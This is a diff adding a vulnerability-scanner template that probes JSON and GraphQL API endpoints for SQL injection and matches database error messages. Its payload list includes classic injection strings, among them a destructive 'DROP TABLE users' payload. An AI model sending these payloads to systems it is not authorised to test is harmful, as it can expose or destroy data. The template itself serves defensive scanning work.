@@ -1,0 +1,77 @@
+id: sqli-json-body
+
+info:
+  name: SQL Injection via JSON Request Body
+  author: security-researcher
+  severity: high
+  description: |
+    JSON 형식의 API 요청에서 SQL 인젝션 취약점을 탐지합니다.
+    REST API 엔드포인트에서 주로 발생합니다.
+  tags: sqli,json,api,rest,injection
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/users"
+      - "{{BaseURL}}/api/product"
+      - "{{BaseURL}}/api/search"
+      - "{{BaseURL}}/api/query"
+      - "{{BaseURL}}/api/v1/search"
+      - "{{BaseURL}}/api/v2/search"
+
+    headers:
+      Content-Type: application/json
+      Accept: application/json
+
+    payloads:
+      sqli_payload:
+        - "1'"
+        - "1 OR 1=1"
+        - "1' OR '1'='1"
+        - "1'; DROP TABLE users--"
+        - "1 UNION SELECT NULL--"
+        - "1' AND SLEEP(0)--"
+
+    body: |
+      {"id": "{{sqli_payload}}"}
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "you have an error in your sql syntax"
+          - "ORA-\\d{5}"
+          - "Microsoft OLE DB"
+          - "PostgreSQL.*ERROR"
+          - "SQLite.*error"
+          - "syntax error"
+          - "unterminated quoted string"
+        condition: or
+        case-insensitive: true
+
+      - type: status
+        status:
+          - 500
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/graphql"
+      - "{{BaseURL}}/api/graphql"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {"query": "{ users(id: \"1'\") { id name } }"}
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "sql.*error|syntax.*error"
+          - "you have an error"
+        condition: or
+        case-insensitive: true
